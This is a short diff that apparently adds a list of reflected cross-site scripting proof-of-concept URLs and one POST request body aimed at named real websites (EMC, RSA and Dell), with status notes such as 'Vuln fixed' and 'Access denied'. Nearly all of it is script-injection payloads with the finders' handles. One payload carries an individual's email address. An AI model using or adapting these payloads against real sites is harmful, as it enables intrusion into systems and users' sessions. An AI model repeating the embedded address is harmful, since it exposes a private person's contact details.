@@ -1,2 +1,30 @@
 http://www.emc.com/global_services/support/clariion_support/index.jsp?openfolder="><script>alert("Ma
 XWeL")</script>
+
+Access denied
+
+Vuln fixed
+
+
+http://www.emc.com/hr/index.jsp?openfolder="><script>alert("MaXWeL")</script>
+
+Access denied
+Vuln fixed
+
+
+POST
+https://rsa-email.rsa.com/servlet/campaignrespondent
+
+email='"></title><script>alert(1337)</script>&remembercheck=on&rememberme=yes&source1=HB&ID=Event_W_ Wombat_Phishing_Q310&CUST_ID=1&CUST_MAIL=kconnearney%40rsasecurity.com&_ID_=rsa.3166.-2&Campaign_=Re gistration+Login+Webform&charset_=ISO-8859-1&_InlineResponseRule_=true&_Sent_=2010-09-13+14%3A40%3A1 0.332&_checkbox_=remembercheck&TIMESTAMP_=2003-08-22+12%3A09%3A59.000&EMail_=kconnearney%40rsasecuri ty.com&__HIDDEN_FIELD_NAMES__=rememberme%3Bsource1%3BID%3BCUST_ID%3BCUST_MAIL%3B_ID_%3BCampaign_%3Bc harset_%3B_InlineResponseRule_%3B_Sent_%3B_checkbox_%3BTIMESTAMP_%3BEMail_%3B__HIDDEN_FIELD_NAMES__
+
+
+Server not found
+
+Vuln fixed
+
+
+http://configure.us.dell.com/dellstore/config.aspx?oc=dndob28&c=us&l=en&s=dhs&cs=19&model_id=inspiro
+n-15-intel-n5040?oc=i14aw32-a&mboxEnv=XSS',%20'560',%20'400');alert('By%20@DiSiqueira_');//
+
+
+
